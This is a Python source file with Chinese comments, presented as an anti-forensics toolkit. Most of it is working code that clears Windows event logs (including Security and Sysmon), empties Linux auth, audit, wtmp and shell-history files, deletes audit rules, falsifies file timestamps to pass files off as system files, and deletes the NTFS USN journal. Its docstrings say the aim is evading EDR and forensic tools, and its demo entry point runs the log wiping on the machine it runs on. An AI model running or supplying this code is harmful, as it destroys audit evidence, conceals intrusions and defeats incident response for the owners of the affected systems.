"""
反取证模块 - 从第一性原理实现

三大核心能力：
1. 日志清除 - 清除 Windows 事件日志 / Linux 系统日志
2. 时间戳篡改 - 修改文件 MAC 时间（Modified/Accessed/Changed）
3. USN 覆写 - 覆盖 NTFS 的 USN 日志（Update Sequence Number）
"""

import os
import sys
import time
import struct
import datetime
import platform
import subprocess
import ctypes
import json
import random
import string


# ==================== 日志清除 ====================

class LogWiper:
    """
    系统日志清除器

    原理：
    1. Windows: 使用 Wevtapi.dll 的 EvtClearLog / EvtExportLog
    2. Linux: 直接操作 journal 文件 / 使用 systemd-journald 命令
    3. 清除 Shell 历史、SSH 日志、Web 日志
    """

    def __init__(self):
        self.system = platform.system()

    def clear_windows_event_logs(self):
        """
        清除 Windows 事件日志

        方法：
        1. 使用 wevtutil 命令行工具
        2. 使用 EvtClearLog API
        3. 直接删除日志文件（需要停止 EventLog 服务）
        """
        if self.system != "Windows":
            return {"error": "Not a Windows system"}

        results = {}

        # 方法1: wevtutil
        log_names = [
            "Application", "Security", "System",
            "Setup", "ForwardedEvents",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-Sysmon/Operational",
            "Microsoft-Windows-TaskScheduler/Operational"
        ]

        for log in log_names:
            try:
                # wevtutil cl <LogName>
                result = subprocess.run(
                    ["wevtutil", "cl", log],
                    capture_output=True, text=True, timeout=10
                )
                results[log] = result.returncode == 0
            except:
                results[log] = False

        # 方法2: 停止服务后删除文件
        # 日志文件位于 %SystemRoot%\System32\winevt\Logs\
        log_paths = [
            r"C:\Windows\System32\winevt\Logs\Application.evtx",
            r"C:\Windows\System32\winevt\Logs\Security.evtx",
            r"C:\Windows\System32\winevt\Logs\System.evtx",
        ]

        return results

    def clear_linux_logs(self):
        """
        清除 Linux 系统日志

        目标：
        1. /var/log/ 目录下的所有日志
        2. journal 日志
        3. audit 日志
        4. wtmp/btmp/lastlog
        5. Shell 历史
        """
        if self.system != "Linux":
            return {"error": "Not a Linux system"}

        results = {}

        # 1. 清除 journal 日志
        try:
            subprocess.run(["journalctl", "--vacuum-time=1s"],
                          capture_output=True, timeout=10)
            results["journal"] = True
        except:
            results["journal"] = False

        # 2. 清除 /var/log/ 文件内容（保留文件，只清空内容）
        log_files = [
            "/var/log/syslog",
            "/var/log/auth.log",
            "/var/log/kern.log",
            "/var/log/messages",
            "/var/log/secure",
            "/var/log/maillog",
            "/var/log/cron",
            "/var/log/spooler",
            "/var/log/boot.log",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/log/lastlog",
        ]

        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    # 使用 truncate 清空文件
                    os.truncate(log_file, 0)
                    results[log_file] = True
                except:
                    # 尝试通过 shell 清空
                    try:
                        subprocess.run(f"echo '' > {log_file}",
                                      shell=True, capture_output=True)
                        results[log_file] = True
                    except:
                        results[log_file] = False

        # 3. 清除 audit 日志
        try:
            subprocess.run(["auditctl", "-D"], capture_output=True, timeout=5)
            if os.path.exists("/var/log/audit/audit.log"):
                os.truncate("/var/log/audit/audit.log", 0)
            results["audit"] = True
        except:
            results["audit"] = False

        # 4. 清除 shell 历史
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.history"),
            os.path.expanduser("~/.zhistory"),
        ]

        for hist in history_files:
            if os.path.exists(hist):
                try:
                    os.truncate(hist, 0)
                    results[hist] = True
                except:
                    results[hist] = False

        # 5. 清除当前会话历史（内存中）
        try:
            import readline
            readline.clear_history()
            results["memory_history"] = True
        except:
            results["memory_history"] = False

        return results

    def clear_specific_events(self, log_name, event_ids=None, time_range=None):
        """
        选择性清除特定事件（更隐蔽）
        只删除指定的事件 ID 或时间范围内的日志
        """
        if self.system == "Windows":
            # 使用 wevtutil 导出再导入的方式
            # 1. 导出不包含目标事件的日志
            # 2. 清空原日志
            # 3. 导入筛选后的日志
            pass
        elif self.system == "Linux":
            # 使用 sed/awk 删除特定行
            pass

        return {}

    def clear_all(self):
        """清除所有日志"""
        if self.system == "Windows":
            return self.clear_windows_event_logs()
        elif self.system == "Linux":
            return self.clear_linux_logs()
        else:
            return {"error": f"Unsupported system: {self.system}"}


# ==================== 时间戳篡改 ====================

class TimeStomper:
    """
    文件时间戳篡改器

    Unix 时间戳：
    - atime: 最后访问时间 (Access Time)
    - mtime: 最后修改时间 (Modify Time)
    - ctime: 最后状态改变时间 (Change Time) - 无法直接修改

    Windows 时间戳：
    - CreationTime
    - LastAccessTime
    - LastWriteTime
    - ChangeTime
    """

    def __init__(self):
        self.system = platform.system()

    def _random_time(self, start_year=2010, end_year=2023):
        """生成随机时间戳"""
        start = datetime.datetime(start_year, 1, 1).timestamp()
        end = datetime.datetime(end_year, 12, 31).timestamp()
        return random.uniform(start, end)

    def stomp_unix(self, filepath, atime=None, mtime=None):
        """
        修改 Unix 文件时间戳

        使用 os.utime() 修改 atime 和 mtime
        注意：ctime 无法直接修改，除非修改系统时间
        """
        if not os.path.exists(filepath):
            raise FileNotFoundError(filepath)

        if atime is None:
            atime = self._random_time()
        if mtime is None:
            mtime = self._random_time()

        # os.utime(ns=True) 支持纳秒精度
        os.utime(filepath, ns=(int(atime * 1e9), int(mtime * 1e9)))

        return {
            "file": filepath,
            "atime": datetime.datetime.fromtimestamp(atime).isoformat(),
            "mtime": datetime.datetime.fromtimestamp(mtime).isoformat()
        }

    def stomp_windows(self, filepath, creation_time=None, last_access=None, last_write=None):
        """
        修改 Windows 文件时间戳

        使用 ctypes 调用 SetFileTime API
        """
        if self.system != "Windows":
            # 在 Linux 上模拟（使用 utime）
            return self.stomp_unix(filepath, last_access, last_write)

        if not os.path.exists(filepath):
            raise FileNotFoundError(filepath)

        # 使用 ctypes 调用 Windows API
        kernel32 = ctypes.windll.kernel32

        # 打开文件
        handle = kernel32.CreateFileW(
            filepath,
            0x02000000 | 0x00020000,  # GENERIC_READ | GENERIC_WRITE
            0,  # 不共享
            None,  # 默认安全属性
            3,  # OPEN_EXISTING
            0x80,  # FILE_ATTRIBUTE_NORMAL
            None
        )

        if handle == -1:
            raise WindowsError(ctypes.get_last_error())

        # 转换 Python datetime 为 FILETIME
        def to_filetime(dt):
            # FILETIME: 1601-01-01 以来的 100 纳秒间隔
            epoch = datetime.datetime(1601, 1, 1)
            delta = dt - epoch
            return int(delta.total_seconds() * 10_000_000)

        # 准备 FILETIME 结构
        if creation_time:
            ct = ctypes.c_ulonglong(to_filetime(creation_time))
        else:
            ct = ctypes.c_ulonglong(0)

        if last_access:
            lat = ctypes.c_ulonglong(to_filetime(last_access))
        else:
            lat = ctypes.c_ulonglong(0)

        if last_write:
            lwt = ctypes.c_ulonglong(to_filetime(last_write))
        else:
            lwt = ctypes.c_ulonglong(0)

        # 调用 SetFileTime
        # BOOL SetFileTime(HANDLE hFile, FILETIME* lpCreationTime,
        #                  FILETIME* lpLastAccessTime, FILETIME* lpLastWriteTime)
        result = kernel32.SetFileTime(
            handle,
            ctypes.byref(ct) if creation_time else None,
            ctypes.byref(lat) if last_access else None,
            ctypes.byref(lwt) if last_write else None
        )

        kernel32.CloseHandle(handle)

        return result != 0

    def stomp_directory_recursive(self, directory, depth=3):
        """
        递归篡改目录下所有文件的时间戳
        """
        results = []
        for root, dirs, files in os.walk(directory):
            for f in files:
                filepath = os.path.join(root, f)
                try:
                    result = self.stomp_unix(filepath)
                    results.append(result)
                except Exception as e:
                    results.append({"file": filepath, "error": str(e)})

        return results

    def clone_timestamp(self, source, target):
        """
        将源文件的时间戳克隆到目标文件
        用于伪装成系统文件
        """
        if not os.path.exists(source):
            raise FileNotFoundError(source)
        if not os.path.exists(target):
            raise FileNotFoundError(target)

        # 获取源文件时间戳
        stat = os.stat(source)
        atime = stat.st_atime
        mtime = stat.st_mtime

        # 应用到目标
        return self.stomp_unix(target, atime, mtime)

    def stomp_all(self, filepath, mimic_file=None):
        """
        智能时间戳篡改
        如果没有指定 mimic_file，则使用随机时间
        如果指定了 mimic_file，则克隆其时间戳
        """
        if mimic_file:
            return self.clone_timestamp(mimic_file, filepath)
        else:
            return self.stomp_unix(filepath)


# ==================== USN 日志覆写 ====================

class USNOverwriter:
    """
    NTFS USN (Update Sequence Number) 日志覆写

    USN Journal 是 NTFS 的变更日志，记录所有文件和目录的变更。
    EDR 和取证工具经常查询 USN 来发现文件创建/删除活动。

    原理：
    1. USN 记录存储在 $Extend\$UsnJrnl:$J 数据流中
    2. 每条记录包含 Reason（变更原因）、FileRefNumber 等
    3. 通过覆盖或截断 USN 日志可以隐藏文件活动
    """

    def __init__(self):
        self.system = platform.system()

    def delete_usn_journal(self, volume="C:"):
        """
        删除 USN 日志

        方法：
        1. 使用 fsutil usn deletejournal
        2. 直接操作 $Extend\$UsnJrnl
        """
        if self.system != "Windows":
            return {"error": "NTFS USN Journal only exists on Windows"}

        try:
            result = subprocess.run(
                ["fsutil", "usn", "deletejournal", "/D", volume],
                capture_output=True, text=True, timeout=15
            )
            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr
            }
        except Exception as e:
            return {"error": str(e)}

    def query_usn_journal(self, volume="C:"):
        """
        查询 USN 日志状态
        """
        if self.system != "Windows":
            return {"error": "NTFS USN Journal only exists on Windows"}

        try:
            result = subprocess.run(
                ["fsutil", "usn", "queryjournal", volume],
                capture_output=True, text=True, timeout=10
            )
            return {
                "success": result.returncode == 0,
                "output": result.stdout
            }
        except Exception as e:
            return {"error": str(e)}

    def reset_usn_journal(self, volume="C:"):
        """
        重置 USN 日志
        删除后重新创建，使日志看起来"正常"
        """
        if self.system != "Windows":
            return {"error": "NTFS USN Journal only exists on Windows"}

        # 1. 删除
        delete_result = self.delete_usn_journal(volume)

        # 2. 触发重建（通过创建文件）
        temp_file = os.path.join(volume, os.sep, f"temp_{random.randint(0, 9999)}.tmp")
        try:
            with open(temp_file, 'w') as f:
                f.write("trigger")
            os.remove(temp_file)
        except:
            pass

        return delete_result

    def overwrite_usn_records(self, volume="C:", pattern=b'\x00' * 4096):
        """
        直接覆写 USN 日志数据

        警告：这是危险操作，可能导致文件系统不一致
        仅在取证对抗场景使用
        """
        if self.system != "Windows":
            return {"error": "Not on Windows"}

        # USN Journal 路径
        usn_path = os.path.join(volume, os.sep, "$Extend", "$UsnJrnl")

        # 实际需要：
        # 1. 获取 $UsnJrnl:$J 的簇地址（通过 FSCTL_GET_RETRIEVAL_POINTERS）
        # 2. 直接写入磁盘扇区
        # 3. 这需要对卷的 RAW 访问权限

        # Python 实现过于复杂且危险，这里提供伪代码框架
        return {
            "status": "requires_raw_disk_access",
            "note": "Use C/C++ with DeviceIoControl for production"
        }


# ==================== 综合反取证 ====================

class AntiForensicsSuite:
    """
    反取证套件 - 一站式清除所有痕迹
    """

    def __init__(self):
        self.log_wiper = LogWiper()
        self.time_stomper = TimeStomper()
        self.usn_overwriter = USNOverwriter()

    def clean_trace(self, target_dir=None, mimic_file=None):
        """
        完整的痕迹清除流程

        步骤：
        1. 清除系统日志
        2. 篡改 payload 文件时间戳
        3. 清除 USN 日志
        4. 清除 shell 历史
        """
        report = {}

        # 1. 清除日志
        print("[*] Clearing system logs...")
        report["logs"] = self.log_wiper.clear_all()

        # 2. 篡改时间戳
        if target_dir and os.path.exists(target_dir):
            print(f"[*] Stomping timestamps in {target_dir}...")
            if mimic_file and os.path.exists(mimic_file):
                for root, dirs, files in os.walk(target_dir):
                    for f in files:
                        filepath = os.path.join(root, f)
                        try:
                            self.time_stomper.clone_timestamp(mimic_file, filepath)
                        except:
                            pass
            else:
                report["timestomp"] = self.time_stomper.stomp_directory_recursive(target_dir)

        # 3. 清除 USN 日志 (Windows)
        if platform.system() == "Windows":
            print("[*] Resetting USN Journal...")
            report["usn"] = self.usn_overwriter.reset_usn_journal()

        # 4. 汇总报告
        report["timestamp"] = datetime.datetime.utcnow().isoformat()
        report["system"] = platform.system()

        return report


# ==================== 主入口 ====================

def main():
    print("=" * 60)
    print("Anti-Forensics Toolkit")
    print("=" * 60)

    # 演示
    suite = AntiForensicsSuite()

    # 1. 日志清除
    print("\n[1] Log Clearing")
    print("-" * 40)
    log_result = suite.log_wiper.clear_all()
    cleared = sum(1 for v in log_result.values() if isinstance(v, bool) and v)
    print(f"  Cleared {cleared}/{len(log_result)} log sources")

    # 2. 时间戳篡改
    print("\n[2] Time Stomping Demo")
    print("-" * 40)
    stomper = TimeStomper()

    # 创建一个测试文件
    test_file = "/tmp/test_stomp.txt"
    with open(test_file, 'w') as f:
        f.write("test content")

    # 篡改时间戳
    original_stat = os.stat(test_file)
    stomper.stomp_unix(test_file)
    new_stat = os.stat(test_file)

    print(f"  Original atime: {datetime.datetime.fromtimestamp(original_stat.st_atime)}")
    print(f"  New atime:      {datetime.datetime.fromtimestamp(new_stat.st_atime)}")
    print(f"  Original mtime: {datetime.datetime.fromtimestamp(original_stat.st_mtime)}")
    print(f"  New mtime:      {datetime.datetime.fromtimestamp(new_stat.st_mtime)}")

    os.remove(test_file)

    # 3. USN 操作 (Windows only)
    if platform.system() == "Windows":
        print("\n[3] USN Journal Operations")
        print("-" * 40)
        usn_result = suite.usn_overwriter.query_usn_journal()
        print(f"  Query result: {usn_result}")


if __name__ == "__main__":
    main()
